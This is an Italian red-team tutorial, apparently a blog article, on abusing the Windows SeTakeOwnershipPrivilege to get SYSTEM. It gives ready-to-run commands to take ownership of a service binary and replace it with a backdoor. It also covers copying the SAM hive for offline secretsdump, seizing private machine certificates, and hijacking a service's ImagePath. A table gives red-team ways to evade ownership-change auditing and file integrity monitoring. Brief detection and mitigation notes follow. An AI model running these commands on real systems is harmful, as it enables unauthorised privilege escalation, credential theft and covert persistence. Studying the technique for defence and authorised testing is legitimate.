---
title: 'SeTakeOwnershipPrivilege: Da Admin a SYSTEM con 3 comandi'
slug: setakeownershipprivilege
description: Come abusare SeTakeOwnershipPrivilege per prendere ownership di binari di sistema e ottenere shell SYSTEM. takeown + icacls + sostituzione binario. Tecnica Red Team.
image: /setakeownershipprivilege.webp
draft: true
date: 2026-06-04T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - setakeownershipprivilege
  - takeown-icacls
---

Hai SeTakeOwnershipPrivilege nel token elevato. Tre comandi: `takeown` per diventare owner, `icacls` per darti Full Control, `copy` per sostituire il binario del servizio SYSTEM. Funziona su qualsiasi file del sistema — binari di servizi, SAM, certificati, chiavi di registro.

***

## Quick Exploit

```cmd
takeown /f "C:\Program Files\VendorApp\service.exe"
icacls "C:\Program Files\VendorApp\service.exe" /grant %username%:F
copy C:\temp\backdoor.exe "C:\Program Files\VendorApp\service.exe" /Y
sc stop NomeServizio && sc start NomeServizio
```

Output atteso:

```
nt authority\system
```

***

## Attack Chain

```
Token elevato con SeTakeOwnershipPrivilege
  → sc qc NomeServizio → identifica binario LocalSystem
  → takeown /f [binary] → ownership acquisita
  → icacls [binary] /grant %username%:F → Full Control
  → copy backdoor.exe → [binary] → sc restart → SYSTEM
```

***

## Tool Decision

| Obiettivo               | Comando                                                                |
| ----------------------- | ---------------------------------------------------------------------- |
| File singolo            | `takeown /f [file]` + `icacls /grant :F`                               |
| Directory ricorsiva     | `takeown /f [dir] /r /d y` + `icacls /grant :F /t`                     |
| Chiave di registro      | `SetACL.exe` — [helgeklein.com/setacl](https://helgeklein.com/setacl/) |
| Via PowerShell (script) | `$acl.SetOwner()` + `$acl.AddAccessRule()`                             |

***

## Cos'è SeTakeOwnershipPrivilege

Windows usa il concetto di "proprietario" separato dai permessi ACL: l'owner di un oggetto ha sempre il diritto di modificare la DACL, anche se non ha permessi espliciti sull'oggetto. Questo privilegio permette di impostare te stesso come owner di qualsiasi oggetto del sistema — file, directory, chiavi di registro, oggetti kernel.

Assegnato per default agli **Administrators**, ma **Enabled solo nel token elevato** (UAC).

***

## Quando esiste

* **Administrators** (token elevato)
* **Account IT privilegiati** con policy "Take ownership of files or other objects"
* **Server Operators** in Active Directory

Verifica:

```cmd
whoami /priv
```

Cerchi:

```
SeTakeOwnershipPrivilege    Take ownership of files or other objects    Enabled
```

Se vedi `Disabled` → token non elevato. Avvia un processo elevato.

Chi ha il privilegio nel sistema:

```cmd
accesschk.exe -a SeTakeOwnershipPrivilege *
```

***

## Step 1 — Identifica il target

Trova un servizio SYSTEM con binario in un path dove le ACL bloccano la scrittura:

```cmd
wmic service get name,startname,pathname | findstr /i "LocalSystem"
```

Verifica il path esatto:

```cmd
sc qc NomeServizio
```

Output:

```
BINARY_PATH_NAME   : C:\Program Files\VendorApp\service.exe
OBJECTNAME         : LocalSystem
```

***

## Step 2 — Prendi ownership del file

```cmd
takeown /f "C:\Program Files\VendorApp\service.exe"
```

Output:

```
SUCCESS: The file (or folder): "C:\Program Files\VendorApp\service.exe" now owned by user "CORP\attacker".
```

***

## Step 3 — Modifica l'ACL per darti Full Control

```cmd
icacls "C:\Program Files\VendorApp\service.exe" /grant %username%:F
```

Output:

```
processed file: C:\Program Files\VendorApp\service.exe
Successfully processed 1 files; Failed processing 0 files
```

***

## Step 4 — Sostituisci il binario e ottieni SYSTEM

```cmd
copy C:\temp\backdoor.exe "C:\Program Files\VendorApp\service.exe" /Y
```

```cmd
sc stop NomeServizio
```

```cmd
sc start NomeServizio
```

Output:

```
nt authority\system
```

***

## Varianti

### Directory intere — takeown ricorsivo

Per prendere ownership di un'intera directory e tutto il suo contenuto:

```cmd
takeown /f "C:\Program Files\VendorApp\" /r /d y
```

```cmd
icacls "C:\Program Files\VendorApp\" /grant %username%:F /t
```

### Accesso a file sensibili — SAM, certificati, config

Per accedere a file protetti da ACL senza SeBackupPrivilege:

```cmd
takeown /f C:\Windows\System32\config\SAM
```

```cmd
icacls C:\Windows\System32\config\SAM /grant %username%:R
```

```cmd
copy C:\Windows\System32\config\SAM C:\temp\sam.hive
```

Stessa procedura per SYSTEM hive, poi secretsdump offline.

Per certificati privati in path protetti:

```cmd
takeown /f "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\" /r /d y
```

```cmd
icacls "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\" /grant %username%:F /t
```

```cmd
dir "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\"
```

### Ownership su chiave di registro con SetACL

Per chiavi di registro con ACL restrittive, SetACL gestisce ownership e permessi in un tool unico. Scaricabile da [helgeklein.com/setacl](https://helgeklein.com/setacl/):

```cmd
SetACL.exe -on "HKLM\SYSTEM\CurrentControlSet\Services\NomeServizio" -ot reg -actn setowner -ownr "n:%USERNAME%"
```

```cmd
SetACL.exe -on "HKLM\SYSTEM\CurrentControlSet\Services\NomeServizio" -ot reg -actn ace -ace "n:%USERNAME%;p:full"
```

Poi modifica ImagePath:

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NomeServizio" /v ImagePath /d "C:\temp\backdoor.exe" /f
```

```cmd
sc stop NomeServizio && sc start NomeServizio
```

### PowerShell — ownership programmatico

Per script che usano le API .NET direttamente:

```powershell
$path = "C:\Program Files\VendorApp\service.exe"
$acl = Get-Acl $path
$identity = [System.Security.Principal.NTAccount]"$env:USERDOMAIN\$env:USERNAME"
$acl.SetOwner($identity)
Set-Acl $path $acl
```

Poi aggiungi Full Control:

```powershell
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule($identity, "FullControl", "Allow")
$acl.AddAccessRule($rule)
Set-Acl $path $acl
```

Infine sostituisci il binario:

```powershell
Copy-Item C:\temp\backdoor.exe $path -Force
```

***

## Scenari reali

**Servizio legacy con binary in path protetto** — binary in `C:\Program Files\Legacy\app.exe` con ACL che bloccano la sovrascrittura, nessun SeRestorePrivilege disponibile. `takeown` + `icacls /grant` + sostituzione → SYSTEM.

**Config file con credenziali ad accesso ristretto** — file di configurazione con credenziali in chiaro, ACL restrittive. `takeown` → `icacls /R` → leggi le credenziali → lateral movement.

**Certificati privati** — certificati di autenticazione macchina in `MachineKeys` con ACL restrittive. Ownership → copia → usa il certificato per autenticazione laterale o decrittare traffico TLS.

***

## Errori comuni

**`takeown` ha successo ma `icacls /grant` fallisce** — Hai preso ownership ma il file è bloccato in scrittura da un handle aperto da un altro processo. Prova a fare stop del servizio prima: `sc stop NomeServizio`.

**Il binario viene copiato ma il servizio non parte** — WDAC blocca l'esecuzione del binary non firmato anche con ownership e ACL corrette. Usa un loader LOLBin o un binary firmato.

**Il file in System32 viene ripristinato automaticamente** — Windows Resource Protection (WRP) ripristina i file nel catalogo di sistema. Usa directory dei servizi in `C:\Program Files\` invece di System32.

**`icacls` sulla chiave di registro fallisce** — `icacls` gestisce solo file, non registry. Per le chiavi di registro usa SetACL.exe: `SetACL.exe -on "HKLM\..." -ot reg -actn setowner -ownr "n:%USERNAME%"`.

***

## Detection e bypass (Red Team view)

| Cosa rileva il Blue Team                    | Come lo bypassa il Red Team                                                             |
| ------------------------------------------- | --------------------------------------------------------------------------------------- |
| Event ID 4670 — ownership change            | Esegui durante finestre di manutenzione o su file meno monitorati                       |
| Sysmon 11 — FileCreate su directory servizi | Usa DLL hijacking su file meno visibili al FIM rispetto al binario principale           |
| FIM sui binary dei servizi                  | Difficile da evitare — combina con persistence via registry (ImagePath) invece che file |
| Audit "Object Access → Ownership Change"    | Spesso non abilitato — in molti ambienti le ownership change passano senza alert        |

***

## Quando fallisce

* **WRP** su file System32 core → ripristino automatico. Usa `C:\Program Files\`
* **WDAC / AppLocker** → blocca esecuzione del binary sostituto
* **PPL** → oggetti processo Protected Process non modificabili tramite ownership
* Privilegio `Disabled` → avvia un processo elevato
* Servizio non riavviabile → verifica: `sc sdshow NomeServizio`

***

## Detection

* **Event ID 4670**: modifica dei permessi su un oggetto
* **Event ID 4657**: modifica di chiavi di registro
* **Sysmon Event ID 11**: FileCreate su path di sistema da processi non standard
* FIM su directory dei servizi critici

***

## Mitigazioni

* **WDAC** — blocca esecuzione di binary non firmati indipendentemente da ownership e ACL
* **FIM** sui binary dei servizi critici
* Limitare SeTakeOwnershipPrivilege agli account strettamente necessari (`secpol.msc`)
* Abilitare audit "Object Access → Ownership Change"

**Nota realistica:** In ambienti senza WDAC (la maggioranza), SeTakeOwnershipPrivilege permette sostituzione silenziosa di qualsiasi binary di servizio. L'audit di ownership change non è abilitato per default — in molti ambienti le ownership change non generano alert.

***

## FAQ

**Differenza con SeRestorePrivilege?**
SeRestorePrivilege scrive direttamente bypassando le ACL in un passo. SeTakeOwnershipPrivilege richiede tre passi ma funziona su qualsiasi oggetto inclusi certificati e chiavi crittografiche che le backup API non coprono.

**Windows ripristina i file System32 che sovrascrivo?**
WRP ripristina i file del catalogo di sistema. I binary in `C:\Program Files\` non sono protetti — sono il target corretto.

***

SeTakeOwnershipPrivilege è il master key per qualsiasi oggetto Windows protetto da ACL — due righe aprono l'accesso a binary di servizi, certificati privati e chiavi di registro sensibili.

***

**Articoli correlati:**

* [SeRestorePrivilege](https://hackita.it/articoli/serestoreprivilege) — scrittura bypass ACL diretta, un passo solo
* [SeBackupPrivilege](https://hackita.it/articoli/sebackupprivilege) — lettura bypass ACL senza toccare ownership
* [SeRelabelPrivilege](https://hackita.it/articoli/serelabelprivilege) — bypass del layer MIC, complementare

**Riferimenti:** [SetACL](https://helgeklein.com/setacl/) · [Microsoft Docs](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects)

Per assessment della superficie nella tua infrastruttura: [hackita.it/servizi](https://hackita.it/servizi)
